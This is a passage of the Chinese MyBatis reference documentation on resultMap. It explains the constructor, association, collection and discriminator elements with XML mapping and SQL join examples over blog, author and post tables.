创建时的一个思想是：数据库不可能永远是你所想或所需的那个样子。 我们希望每个数据库都具备良好的第三范式或 BCNF 范式，可惜它们并不都是那样。 如果能有一种数据库映射模式，完美适配所有的应用程序，那就太好了，但可惜也没有。 而 ResultMap 就是 MyBatis 对这个问题的答案。 比如，我们如何映射下面这个语句？ 12345678910111213141516171819202122232425262728293031323334&lt;!-- 非常复杂的语句 --&gt;&lt;select id=&quot;selectBlogDetails&quot; resultMap=&quot;detailedBlogResultMap&quot;&gt; select B.id as blog_id, B.title as blog_title, B.author_id as blog_author_id, A.id as author_id, A.username as author_username, A.password as author_password, A.email as author_email, A.bio as author_bio, A.favourite_section as author_favourite_section, P.id as post_id, P.blog_id as post_blog_id, P.author_id as post_author_id, P.created_on as post_created_on, P.section as post_section, P.subject as post_subject, P.draft as draft, P.body as post_body, C.id as comment_id, C.post_id as comment_post_id, C.name as comment_name, C.comment as comment_text, T.id as tag_id, T.name as tag_name from Blog B left outer join Author A on B.author_id = A.id left outer join Post P on B.id = P.blog_id left outer join Comment C on P.id = C.post_id left outer join Post_Tag PT on PT.post_id = P.id left outer join Tag T on PT.tag_id = T.id where B.id = #&#123;id&#125;&lt;/select&gt; 你可能想把它映射到一个智能的对象模型，这个对象表示了一篇博客，它由某位作者所写，有很多的博文，每篇博文有零或多条的评论和标签。 我们先来看看下面这个完整的例子，它是一个非常复杂的结果映射（假设作者，博客，博文，评论和标签都是类型别名）。 不用紧张，我们会一步一步地来说明。虽然它看起来令人望而生畏，但其实非常简单。 1234567891011121314151617181920212223242526272829&lt;!-- 非常复杂的结果映射 --&gt;&lt;resultMap id=&quot;detailedBlogResultMap&quot; type=&quot;Blog&quot;&gt; &lt;constructor&gt; &lt;idArg column=&quot;blog_id&quot; javaType=&quot;int&quot;/&gt; &lt;/constructor&gt; &lt;result property=&quot;title&quot; column=&quot;blog_title&quot;/&gt; &lt;association property=&quot;author&quot; javaType=&quot;Author&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;author_id&quot;/&gt; &lt;result property=&quot;username&quot; column=&quot;author_username&quot;/&gt; &lt;result property=&quot;password&quot; column=&quot;author_password&quot;/&gt; &lt;result property=&quot;email&quot; column=&quot;author_email&quot;/&gt; &lt;result property=&quot;bio&quot; column=&quot;author_bio&quot;/&gt; &lt;result property=&quot;favouriteSection&quot; column=&quot;author_favourite_section&quot;/&gt; &lt;/association&gt; &lt;collection property=&quot;posts&quot; ofType=&quot;Post&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;post_id&quot;/&gt; &lt;result property=&quot;subject&quot; column=&quot;post_subject&quot;/&gt; &lt;association property=&quot;author&quot; javaType=&quot;Author&quot;/&gt; &lt;collection property=&quot;comments&quot; ofType=&quot;Comment&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;comment_id&quot;/&gt; &lt;/collection&gt; &lt;collection property=&quot;tags&quot; ofType=&quot;Tag&quot; &gt; &lt;id property=&quot;id&quot; column=&quot;tag_id&quot;/&gt; &lt;/collection&gt; &lt;discriminator javaType=&quot;int&quot; column=&quot;draft&quot;&gt; &lt;case value=&quot;1&quot; resultType=&quot;DraftPost&quot;/&gt; &lt;/discriminator&gt; &lt;/collection&gt;&lt;/resultMap&gt; resultMap 元素有很多子元素和一个值得深入探讨的结构。 下面是resultMap 元素的概念视图。 结果映射（resultMap） constructor - 用于在实例化类时，注入结果到构造方法中 idArg - ID 参数；标记出作为 ID 的结果可以帮助提高整体性能 arg - 将被注入到构造方法的一个普通结果 id – 一个 ID 结果；标记出作为 ID 的结果可以帮助提高整体性能 result – 注入到字段或 JavaBean 属性的普通结果 association – 一个复杂类型的关联；许多结果将包装成这种类型 嵌套结果映射 – 关联可以是 resultMap 元素，或是对其它结果映射的引用 collection – 一个复杂类型的集合 嵌套结果映射 – 集合可以是 resultMap 元素，或是对其它结果映射的引用 discriminator – 使用结果值来决定使用哪个 resultMap case – 基于某些值的结果映射 嵌套结果映射 – case 也是一个结果映射，因此具有相同的结构和元素；或者引用其它的结果映射 ResultMap 的属性列表 属性 描述 id 当前命名空间中的一个唯一标识，用于标识一个结果映射。 type 类的完全限定名, 或者一个类型别名（关于内置的类型别名，可以参考上面的表格）。 autoMapping 如果设置这个属性，MyBatis 将会为本结果映射开启或者关闭自动映射。 这个属性会覆盖全局的属性 autoMappingBehavior。默认值：未设置（unset）。 最好逐步建立结果映射。单元测试可以在这个过程中起到很大帮助。 如果你尝试一次性创建像上面示例那么巨大的结果映射，不仅容易出错，难度也会直线上升。 所以，从最简单的形态开始，逐步迭代。而且别忘了单元测试！ 有时候，框架的行为像是一个黑盒子（无论是否开源）。因此，为了确保实现的行为与你的期望相一致，最好编写单元测试。 并且单元测试在提交 bug 时也能起到很大的作用。 下一部分将详细说明每个元素。 id &amp; result12&lt;id property=&quot;id&quot; column=&quot;post_id&quot;/&gt;&lt;result property=&quot;subject&quot; column=&quot;post_subject&quot;/&gt; 这些元素是结果映射的基础。id 和 result 元素都将一个列的值映射到一个简单数据类型（String, int, double, Date 等）的属性或字段。 这两者之间的唯一不同是，id 元素对应的属性会被标记为对象的标识符，在比较对象实例时使用。 这样可以提高整体的性能，尤其是进行缓存和嵌套结果映射（也就是连接映射）的时候。 两个元素都有一些属性： 属性 描述 property 映射到列结果的字段或属性。如果 JavaBean 有这个名字的属性（property），会先使用该属性。否则 MyBatis 将会寻找给定名称的字段（field）。 无论是哪一种情形，你都可以使用常见的点式分隔形式进行复杂属性导航。 比如，你可以这样映射一些简单的东西：“username”，或者映射到一些复杂的东西上：“address.street.number”。 column 数据库中的列名，或者是列的别名。一般情况下，这和传递给 resultSet.getString(columnName) 方法的参数一样。 javaType 一个 Java 类的全限定名，或一个类型别名（关于内置的类型别名，可以参考上面的表格）。 如果你映射到一个 JavaBean，MyBatis 通常可以推断类型。然而，如果你映射到的是 HashMap，那么你应该明确地指定 javaType 来保证行为与期望的相一致。 jdbcType JDBC 类型，所支持的 JDBC 类型参见这个表格之后的“支持的 JDBC 类型”。 只需要在可能执行插入、更新和删除的且允许空值的列上指定 JDBC 类型。这是 JDBC 的要求而非 MyBatis 的要求。如果你直接面向 JDBC 编程，你需要对可以为空值的列指定这个类型。 typeHandler 我们在前面讨论过默认的类型处理器。使用这个属性，你可以覆盖默认的类型处理器。 这个属性值是一个类型处理器实现类的全限定名，或者是类型别名。 支持的 JDBC 类型为了以后可能的使用场景，MyBatis 通过内置的 jdbcType 枚举类型支持下面的 JDBC 类型。 BIT FLOAT CHAR TIMESTAMP OTHER UNDEFINED TINYINT REAL VARCHAR BINARY BLOB NVARCHAR SMALLINT DOUBLE LONGVARCHAR VARBINARY CLOB NCHAR INTEGER NUMERIC DATE LONGVARBINARY BOOLEAN NCLOB BIGINT DECIMAL TIME NULL CURSOR ARRAY 构造方法通过修改对象属性的方式，可以满足大多数的数据传输对象（Data Transfer Object, DTO）以及绝大部分领域模型的要求。但有些情况下你想使用不可变类。 一般来说，很少改变或基本不变的包含引用或数据的表，很适合使用不可变类。 构造方法注入允许你在初始化时为类设置属性的值，而不用暴露出公有方法。MyBatis 也支持私有属性和私有 JavaBean 属性来完成注入，但有一些人更青睐于通过构造方法进行注入。 constructor 元素就是为此而生的。 1234567public class User &#123; //... public User(Integer id, String username, int age) &#123; //... &#125;//...&#125; 为了将结果注入构造方法，MyBatis 需要通过某种方式定位相应的构造方法。 在下面的例子中，MyBatis 搜索一个声明了三个形参的构造方法，参数类型以 java.lang.Integer, java.lang.String 和 int 的顺序给出。 12345&lt;constructor&gt; &lt;idArg column=&quot;id&quot; javaType=&quot;int&quot;/&gt; &lt;arg column=&quot;username&quot; javaType=&quot;String&quot;/&gt; &lt;arg column=&quot;age&quot; javaType=&quot;_int&quot;/&gt;&lt;/constructor&gt; 当你在处理一个带有多个形参的构造方法时，很容易搞乱 arg 元素的顺序。 从版本 3.4.3 开始，可以在指定参数名称的前提下，以任意顺序编写 arg 元素。 为了通过名称来引用构造方法参数，你可以添加 @Param 注解，或者使用 ‘-parameters’ 编译选项并启用 useActualParamName 选项（默认开启）来编译项目。下面是一个等价的例子，尽管函数签名中第二和第三个形参的顺序与 constructor 元素中参数声明的顺序不匹配。 12345&lt;constructor&gt; &lt;idArg column=&quot;id&quot; javaType=&quot;int&quot; name=&quot;id&quot; /&gt; &lt;arg column=&quot;age&quot; javaType=&quot;_int&quot; name=&quot;age&quot; /&gt; &lt;arg column=&quot;username&quot; javaType=&quot;String&quot; name=&quot;username&quot; /&gt;&lt;/constructor&gt; 如果存在名称和类型相同的属性，那么可以省略 javaType 。 剩余的属性和规则和普通的 id 和 result 元素是一样的。 属性 描述 column 数据库中的列名，或者是列的别名。一般情况下，这和传递给 resultSet.getString(columnName) 方法的参数一样。 javaType 一个 Java 类的完全限定名，或一个类型别名（关于内置的类型别名，可以参考上面的表格）。 如果你映射到一个 JavaBean，MyBatis 通常可以推断类型。然而，如果你映射到的是 HashMap，那么你应该明确地指定 javaType 来保证行为与期望的相一致。 jdbcType JDBC 类型，所支持的 JDBC 类型参见这个表格之前的“支持的 JDBC 类型”。 只需要在可能执行插入、更新和删除的且允许空值的列上指定 JDBC 类型。这是 JDBC 的要求而非 MyBatis 的要求。如果你直接面向 JDBC 编程，你需要对可能存在空值的列指定这个类型。 typeHandler 我们在前面讨论过默认的类型处理器。使用这个属性，你可以覆盖默认的类型处理器。 这个属性值是一个类型处理器实现类的完全限定名，或者是类型别名。 select 用于加载复杂类型属性的映射语句的 ID，它会从 column 属性中指定的列检索数据，作为参数传递给此 select 语句。具体请参考关联元素。 resultMap 结果映射的 ID，可以将嵌套的结果集映射到一个合适的对象树中。 它可以作为使用额外 select 语句的替代方案。它可以将多表连接操作的结果映射成一个单一的 ResultSet。这样的 ResultSet 将会将包含重复或部分数据重复的结果集。为了将结果集正确地映射到嵌套的对象树中，MyBatis 允许你 “串联”结果映射，以便解决嵌套结果集的问题。想了解更多内容，请参考下面的关联元素。 name 构造方法形参的名字。从 3.4.3 版本开始，通过指定具体的参数名，你可以以任意顺序写入 arg 元素。参看上面的解释。 关联1234&lt;association property=&quot;author&quot; column=&quot;blog_author_id&quot; javaType=&quot;Author&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;author_id&quot;/&gt; &lt;result property=&quot;username&quot; column=&quot;author_username&quot;/&gt;&lt;/association&gt; 关联（association）元素处理“有一个”类型的关系。 比如，在我们的示例中，一个博客有一个用户。关联结果映射和其它类型的映射工作方式差不多。 你需要指定目标属性名以及属性的javaType（很多时候 MyBatis 可以自己推断出来），在必要的情况下你还可以设置 JDBC 类型，如果你想覆盖获取结果值的过程，还可以设置类型处理器。 关联的不同之处是，你需要告诉 MyBatis 如何加载关联。MyBatis 有两种不同的方式加载关联： 嵌套 Select 查询：通过执行另外一个 SQL 映射语句来加载期望的复杂类型。 嵌套结果映射：使用嵌套的结果映射来处理连接结果的重复子集。 首先，先让我们来看看这个元素的属性。你将会发现，和普通的结果映射相比，它只在 select 和 resultMap 属性上有所不同。 属性 描述 property 映射到列结果的字段或属性。如果用来匹配的 JavaBean 存在给定名字的属性，那么它将会被使用。否则 MyBatis 将会寻找给定名称的字段。 无论是哪一种情形，你都可以使用通常的点式分隔形式进行复杂属性导航。 比如，你可以这样映射一些简单的东西：“username”，或者映射到一些复杂的东西上：“address.street.number”。 javaType 一个 Java 类的完全限定名，或一个类型别名（关于内置的类型别名，可以参考上面的表格）。 如果你映射到一个 JavaBean，MyBatis 通常可以推断类型。然而，如果你映射到的是 HashMap，那么你应该明确地指定 javaType 来保证行为与期望的相一致。 jdbcType JDBC 类型，所支持的 JDBC 类型参见这个表格之前的“支持的 JDBC 类型”。 只需要在可能执行插入、更新和删除的且允许空值的列上指定 JDBC 类型。这是 JDBC 的要求而非 MyBatis 的要求。如果你直接面向 JDBC 编程，你需要对可能存在空值的列指定这个类型。 typeHandler 我们在前面讨论过默认的类型处理器。使用这个属性，你可以覆盖默认的类型处理器。 这个属性值是一个类型处理器实现类的完全限定名，或者是类型别名。 关联的嵌套 Select 查询 属性 描述 column 数据库中的列名，或者是列的别名。一般情况下，这和传递给 resultSet.getString(columnName) 方法的参数一样。 注意：在使用复合主键的时候，你可以使用 column=&quot;&#123;prop1=col1,prop2=col2&#125;&quot; 这样的语法来指定多个传递给嵌套 Select 查询语句的列名。这会使得 prop1 和 prop2 作为参数对象，被设置为对应嵌套 Select 语句的参数。 select 用于加载复杂类型属性的映射语句的 ID，它会从 column 属性指定的列中检索数据，作为参数传递给目标 select 语句。 具体请参考下面的例子。注意：在使用复合主键的时候，你可以使用 column=&quot;&#123;prop1=col1,prop2=col2&#125;&quot; 这样的语法来指定多个传递给嵌套 Select 查询语句的列名。这会使得 prop1 和 prop2 作为参数对象，被设置为对应嵌套 Select 语句的参数。 fetchType 可选的。有效值为 lazy 和 eager。 指定属性后，将在映射中忽略全局配置参数 lazyLoadingEnabled，使用属性的值。 实例： 1234567891011&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt; &lt;association property=&quot;author&quot; column=&quot;author_id&quot; javaType=&quot;Author&quot; select=&quot;selectAuthor&quot;/&gt;&lt;/resultMap&gt;&lt;select id=&quot;selectBlog&quot; resultMap=&quot;blogResult&quot;&gt; SELECT * FROM BLOG WHERE ID = #&#123;id&#125;&lt;/select&gt;&lt;select id=&quot;selectAuthor&quot; resultType=&quot;Author&quot;&gt; SELECT * FROM AUTHOR WHERE ID = #&#123;id&#125;&lt;/select&gt; 就是这么简单。我们有两个 select 查询语句：一个用来加载博客（Blog），另外一个用来加载作者（Author），而且博客的结果映射描述了应该使用 selectAuthor 语句加载它的 author 属性。 其它所有的属性将会被自动加载，只要它们的列名和属性名相匹配。 这种方式虽然很简单，但在大型数据集或大型数据表上表现不佳。这个问题被称为“N+1 查询问题”。 概括地讲，N+1 查询问题是这样子的： 你执行了一个单独的 SQL 语句来获取结果的一个列表（就是“+1”）。 对列表返回的每条记录，你执行一个 select 查询语句来为每条记录加载详细信息（就是“N”）。 这个问题会导致成百上千的 SQL 语句被执行。有时候，我们不希望产生这样的后果。 好消息是，MyBatis 能够对这样的查询进行延迟加载，因此可以将大量语句同时运行的开销分散开来。 然而，如果你加载记录列表之后立刻就遍历列表以获取嵌套的数据，就会触发所有的延迟加载查询，性能可能会变得很糟糕。 所以还有另外一种方法。 关联的嵌套结果映射 属性 描述 resultMap 结果映射的 ID，可以将此关联的嵌套结果集映射到一个合适的对象树中。 它可以作为使用额外 select 语句的替代方案。它可以将多表连接操作的结果映射成一个单一的 ResultSet。这样的 ResultSet 有部分数据是重复的。 为了将结果集正确地映射到嵌套的对象树中, MyBatis 允许你“串联”结果映射，以便解决嵌套结果集的问题。使用嵌套结果映射的一个例子在表格以后。 columnPrefix 当连接多个表时，你可能会不得不使用列别名来避免在 ResultSet 中产生重复的列名。指定 columnPrefix 列名前缀允许你将带有这些前缀的列映射到一个外部的结果映射中。 详细说明请参考后面的例子。 notNullColumn 默认情况下，在至少一个被映射到属性的列不为空时，子对象才会被创建。 你可以在这个属性上指定非空的列来改变默认行为，指定后，Mybatis 将只在这些列非空时才创建一个子对象。可以使用逗号分隔来指定多个列。默认值：未设置（unset）。 autoMapping 如果设置这个属性，MyBatis 将会为本结果映射开启或者关闭自动映射。 这个属性会覆盖全局的属性 autoMappingBehavior。注意，本属性对外部的结果映射无效，所以不能搭配 select 或 resultMap 元素使用。默认值：未设置（unset）。 之前，你已经看到了一个非常复杂的嵌套关联的例子。 下面的例子则是一个非常简单的例子，用于演示嵌套结果映射如何工作。 现在我们将博客表和作者表连接在一起，而不是执行一个独立的查询语句，就像这样： 12345678910111213&lt;select id=&quot;selectBlog&quot; resultMap=&quot;blogResult&quot;&gt; select B.id as blog_id, B.title as blog_title, B.author_id as blog_author_id, A.id as author_id, A.username as author_username, A.password as author_password, A.email as author_email, A.bio as author_bio from Blog B left outer join Author A on B.author_id = A.id where B.id = #&#123;id&#125;&lt;/select&gt; 注意查询中的连接，以及为确保结果能够拥有唯一且清晰的名字，我们设置的别名。 这使得进行映射非常简单。现在我们可以映射这个结果： 12345678910111213&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;blog_id&quot; /&gt; &lt;result property=&quot;title&quot; column=&quot;blog_title&quot;/&gt; &lt;association property=&quot;author&quot; column=&quot;blog_author_id&quot; javaType=&quot;Author&quot; resultMap=&quot;authorResult&quot;/&gt;&lt;/resultMap&gt;&lt;resultMap id=&quot;authorResult&quot; type=&quot;Author&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;author_id&quot;/&gt; &lt;result property=&quot;username&quot; column=&quot;author_username&quot;/&gt; &lt;result property=&quot;password&quot; column=&quot;author_password&quot;/&gt; &lt;result property=&quot;email&quot; column=&quot;author_email&quot;/&gt; &lt;result property=&quot;bio&quot; column=&quot;author_bio&quot;/&gt;&lt;/resultMap&gt; 在上面的例子中，你可以看到，博客（Blog）作者（author）的关联元素委托名为 “authorResult” 的结果映射来加载作者对象的实例。 非常重要： id 元素在嵌套结果映射中扮演着非常重要的角色。你应该总是指定一个或多个可以唯一标识结果的属性。 虽然，即使不指定这个属性，MyBatis 仍然可以工作，但是会产生严重的性能问题。 只需要指定可以唯一标识结果的最少属性。显然，你可以选择主键（复合主键也可以）。 现在，上面的示例使用了外部的结果映射元素来映射关联。这使得 Author 的结果映射可以被重用。 然而，如果你不打算重用它，或者你更喜欢将你所有的结果映射放在一个具有描述性的结果映射元素中。 你可以直接将结果映射作为子元素嵌套在内。这里给出使用这种方式的等效例子： 1234567891011&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;blog_id&quot; /&gt; &lt;result property=&quot;title&quot; column=&quot;blog_title&quot;/&gt; &lt;association property=&quot;author&quot; javaType=&quot;Author&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;author_id&quot;/&gt; &lt;result property=&quot;username&quot; column=&quot;author_username&quot;/&gt; &lt;result property=&quot;password&quot; column=&quot;author_password&quot;/&gt; &lt;result property=&quot;email&quot; column=&quot;author_email&quot;/&gt; &lt;result property=&quot;bio&quot; column=&quot;author_bio&quot;/&gt; &lt;/association&gt;&lt;/resultMap&gt; 那如果博客（blog）有一个共同作者（co-author）该怎么办？select 语句看起来会是这样的： 12345678910111213141516171819&lt;select id=&quot;selectBlog&quot; resultMap=&quot;blogResult&quot;&gt; select B.id as blog_id, B.title as blog_title, A.id as author_id, A.username as author_username, A.password as author_password, A.email as author_email, A.bio as author_bio, CA.id as co_author_id, CA.username as co_author_username, CA.password as co_author_password, CA.email as co_author_email, CA.bio as co_author_bio from Blog B left outer join Author A on B.author_id = A.id left outer join Author CA on B.co_author_id = CA.id where B.id = #&#123;id&#125;&lt;/select&gt; 回忆一下，Author 的结果映射定义如下： 1234567&lt;resultMap id=&quot;authorResult&quot; type=&quot;Author&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;author_id&quot;/&gt; &lt;result property=&quot;username&quot; column=&quot;author_username&quot;/&gt; &lt;result property=&quot;password&quot; column=&quot;author_password&quot;/&gt; &lt;result property=&quot;email&quot; column=&quot;author_email&quot;/&gt; &lt;result property=&quot;bio&quot; column=&quot;author_bio&quot;/&gt;&lt;/resultMap&gt; 由于结果中的列名与结果映射中的列名不同。你需要指定 columnPrefix 以便重复使用该结果映射来映射 co-author 的结果。 123456789&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;blog_id&quot; /&gt; &lt;result property=&quot;title&quot; column=&quot;blog_title&quot;/&gt; &lt;association property=&quot;author&quot; resultMap=&quot;authorResult&quot; /&gt; &lt;association property=&quot;coAuthor&quot; resultMap=&quot;authorResult&quot; columnPrefix=&quot;co_&quot; /&gt;&lt;/resultMap&gt; 关联的多结果集（ResultSet） 属性 描述 column 当使用多个结果集时，该属性指定结果集中用于与 foreignColumn 匹配的列（多个列名以逗号隔开），以识别关系中的父类型与子类型。 foreignColumn 指定外键对应的列名，指定的列将与父类型中 column 的给出的列进行匹配。 resultSet 指定用于加载复杂类型的结果集名字。 从版本 3.2.3 开始，MyBatis 提供了另一种解决 N+1 查询问题的方法。 某些数据库允许存储过程返回多个结果集，或一次性执行多个语句，每个语句返回一个结果集。 我们可以利用这个特性，在不使用连接的情况下，只访问数据库一次就能获得相关数据。 在例子中，存储过程执行下面的查询并返回两个结果集。第一个结果集会返回博客（Blog）的结果，第二个则返回作者（Author）的结果。 123SELECT * FROM BLOG WHERE ID = #&#123;id&#125;SELECT * FROM AUTHOR WHERE ID = #&#123;id&#125; 在映射语句中，必须通过 resultSets 属性为每个结果集指定一个名字，多个名字使用逗号隔开。 123&lt;select id=&quot;selectBlog&quot; resultSets=&quot;blogs,authors&quot; resultMap=&quot;blogResult&quot; statementType=&quot;CALLABLE&quot;&gt; &#123;call getBlogsAndAuthors(#&#123;id,jdbcType=INTEGER,mode=IN&#125;)&#125;&lt;/select&gt; 现在我们可以指定使用 “authors” 结果集的数据来填充 “author” 关联： 1234567891011&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;id&quot; /&gt; &lt;result property=&quot;title&quot; column=&quot;title&quot;/&gt; &lt;association property=&quot;author&quot; javaType=&quot;Author&quot; resultSet=&quot;authors&quot; column=&quot;author_id&quot; foreignColumn=&quot;id&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;id&quot;/&gt; &lt;result property=&quot;username&quot; column=&quot;username&quot;/&gt; &lt;result property=&quot;password&quot; column=&quot;password&quot;/&gt; &lt;result property=&quot;email&quot; column=&quot;email&quot;/&gt; &lt;result property=&quot;bio&quot; column=&quot;bio&quot;/&gt; &lt;/association&gt;&lt;/resultMap&gt; 你已经在上面看到了如何处理“有一个”类型的关联。但是该怎么处理“有很多个”类型的关联呢？这就是我们接下来要介绍的。 集合12345&lt;collection property=&quot;posts&quot; ofType=&quot;domain.blog.Post&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;post_id&quot;/&gt; &lt;result property=&quot;subject&quot; column=&quot;post_subject&quot;/&gt; &lt;result property=&quot;body&quot; column=&quot;post_body&quot;/&gt;&lt;/collection&gt; 集合元素和关联元素几乎是一样的，它们相似的程度之高，以致于没有必要再介绍集合元素的相似部分。 所以让我们来关注它们的不同之处吧。 我们来继续上面的示例，一个博客（Blog）只有一个作者（Author)。但一个博客有很多文章（Post)。 在博客类中，这可以用下面的写法来表示： 1private List&lt;Post&gt; posts; 要像上面这样，映射嵌套结果集合到一个 List 中，可以使用集合元素。 和关联元素一样，我们可以使用嵌套 Select 查询，或基于连接的嵌套结果映射集合。 集合的嵌套 Select 查询首先，让我们看看如何使用嵌套 Select 查询来为博客加载文章。 1234567891011&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt; &lt;collection property=&quot;posts&quot; javaType=&quot;ArrayList&quot; column=&quot;id&quot; ofType=&quot;Post&quot; select=&quot;selectPostsForBlog&quot;/&gt;&lt;/resultMap&gt;&lt;select id=&quot;selectBlog&quot; resultMap=&quot;blogResult&quot;&gt; SELECT * FROM BLOG WHERE ID = #&#123;id&#125;&lt;/select&gt;&lt;select id=&quot;selectPostsForBlog&quot; resultType=&quot;Post&quot;&gt; SELECT * FROM POST WHERE BLOG_ID = #&#123;id&#125;&lt;/select&gt; 你可能会立刻注意到几个不同，但大部分都和我们上面学习过的关联元素非常相似。 首先，你会注意到我们使用的是集合元素。 接下来你会注意到有一个新的 “ofType” 属性。这个属性非常重要，它用来将 JavaBean（或字段）属性的类型和集合存储的类型区分开来。 所以你可以按照下面这样来阅读映射： 1&lt;collection property=&quot;posts&quot; javaType=&quot;ArrayList&quot; column=&quot;id&quot; ofType=&quot;Post&quot; select=&quot;selectPostsForBlog&quot;/&gt; 读作： “posts 是一个存储 Post 的 ArrayList 集合” 在一般情况下，MyBatis 可以推断 javaType 属性，因此并不需要填写。所以很多时候你可以简略成： 1&lt;collection property=&quot;posts&quot; column=&quot;id&quot; ofType=&quot;Post&quot; select=&quot;selectPostsForBlog&quot;/&gt; 集合的嵌套结果映射现在你可能已经猜到了集合的嵌套结果映射是怎样工作的——除了新增的 “ofType” 属性，它和关联的完全相同。 首先, 让我们看看对应的 SQL 语句： 123456789101112&lt;select id=&quot;selectBlog&quot; resultMap=&quot;blogResult&quot;&gt; select B.id as blog_id, B.title as blog_title, B.author_id as blog_author_id, P.id as post_id, P.subject as post_subject, P.body as post_body, from Blog B left outer join Post P on B.id = P.blog_id where B.id = #&#123;id&#125;&lt;/select&gt; 我们再次连接了博客表和文章表，并且为每一列都赋予了一个有意义的别名，以便映射保持简单。 要映射博客里面的文章集合，就这么简单： 123456789&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;blog_id&quot; /&gt; &lt;result property=&quot;title&quot; column=&quot;blog_title&quot;/&gt; &lt;collection property=&quot;posts&quot; ofType=&quot;Post&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;post_id&quot;/&gt; &lt;result property=&quot;subject&quot; column=&quot;post_subject&quot;/&gt; &lt;result property=&quot;body&quot; column=&quot;post_body&quot;/&gt; &lt;/collection&gt;&lt;/resultMap&gt; 再提醒一次，要记得上面 id 元素的重要性，如果你不记得了，请阅读关联部分的相关部分。 如果你喜欢更详略的、可重用的结果映射，你可以使用下面的等价形式： 1234567891011&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;blog_id&quot; /&gt; &lt;result property=&quot;title&quot; column=&quot;blog_title&quot;/&gt; &lt;collection property=&quot;posts&quot; ofType=&quot;Post&quot; resultMap=&quot;blogPostResult&quot; columnPrefix=&quot;post_&quot;/&gt;&lt;/resultMap&gt;&lt;resultMap id=&quot;blogPostResult&quot; type=&quot;Post&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;id&quot;/&gt; &lt;result property=&quot;subject&quot; column=&quot;subject&quot;/&gt; &lt;result property=&quot;body&quot; column=&quot;body&quot;/&gt;&lt;/resultMap&gt; 集合的多结果集（ResultSet）像关联元素那样，我们可以通过执行存储过程实现，它会执行两个查询并返回两个结果集，一个是博客的结果集，另一个是文章的结果集： 123SELECT * FROM BLOG WHERE ID = #&#123;id&#125;SELECT * FROM POST WHERE BLOG_ID = #&#123;id&#125; 在映射语句中，必须通过 resultSets 属性为每个结果集指定一个名字，多个名字使用逗号隔开。 123&lt;select id=&quot;selectBlog&quot; resultSets=&quot;blogs,posts&quot; resultMap=&quot;blogResult&quot;&gt; &#123;call getBlogsAndPosts(#&#123;id,jdbcType=INTEGER,mode=IN&#125;)&#125;&lt;/select&gt; 我们指定 “posts” 集合将会使用存储在 “posts” 结果集中的数据进行填充： 123456789&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;id&quot; /&gt; &lt;result property=&quot;title&quot; column=&quot;title&quot;/&gt; &lt;collection property=&quot;posts&quot; ofType=&quot;Post&quot; resultSet=&quot;posts&quot; column=&quot;id&quot; foreignColumn=&quot;blog_id&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;id&quot;/&gt; &lt;result property=&quot;subject&quot; column=&quot;subject&quot;/&gt; &lt;result property=&quot;body&quot; column=&quot;body&quot;/&gt; &lt;/collection&gt;&lt;/resultMap&gt; 注意 对关联或集合的映射，并没有深度、广度或组合上的要求。但在映射时要留意性能问题。 在探索最佳实践的过程中，应用的单元测试和性能测试会是你的好帮手。 而 MyBatis 的好处在于，可以在不对你的代码引入重大变更（如果有）的情况下，允许你之后改变你的想法。 高级关联和集合映射是一个深度话题。文档的介绍只能到此为止。配合少许的实践，你会很快了解全部的用法。 鉴别器123&lt;discriminator javaType=&quot;int&quot; column=&quot;draft&quot;&gt; &lt;case value=&quot;1&quot; resultType=&quot;DraftPost&quot;/&gt;&lt;/discriminator&gt; 有时候，一个数据库查询可能会返回多个不同的结果集（但总体上还是有一定的联系的）。 鉴别器（discriminator）元素就是被设计来应对这种情况的，另外也能处理其它情况，例如类的继承层次结构。 鉴别器的概念很好理解——它很像 Java 语言中的 switch 语句。 一个鉴别器的定义需要指定 column 和 javaType 属性。column 指定了 MyBatis 查询被比较值的地方。 而 javaType 用来确保使用正确的相等测试（虽然很多情况下字符串的相等测试都可以工作）。例如： 1234567891011121314&lt;resultMap id=&quot;vehicleResult&quot; type=&quot;Vehicle&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;id&quot; /&gt; &lt;result property=&quot;vin&quot; column=&quot;vin&quot;/&gt; &lt;result property=&quot;year&quot; column=&quot;year&quot;/&gt; &lt;result property=&quot;make&quot; column=&quot;make&quot;/&gt; &lt;result property=&quot;model&quot; column=&quot;model&quot;/&gt; &lt;result property=&quot;color&quot; column=&quot;color&quot;/&gt; &lt;discriminator javaType=&quot;int&quot; column=&quot;vehicle_type&quot;&gt; &lt;case value=&quot;1&quot; resultMap=&quot;carResult&quot;/&gt; &lt;case value=&quot;2&quot; resultMap=&quot;truckResult&quot;/&gt; &lt;case value=&quot;3&quot; resultMap=&quot;vanResult&quot;/&gt; &lt;case value=&quot;4&quot; resultMap=&quot;suvResult&quot;/&gt; &lt;/discriminator&gt;&lt;/resultMap&gt; 在这个示例中，MyBatis 会从结果集中得到每条记录，然后比较它的 vehicle type 值。 如果它匹配任意一个鉴别器的 case，就会使用这个 case 指定的结果映射。 这个过程是互斥的，也就是说，剩余的结果映射将被忽略（除非它是扩展的，我们将在稍后讨论它）。 如果不能匹配任何一个 case，MyBatis 就只会使用鉴别器块外定义的结果映射。 所以，如果 carResult 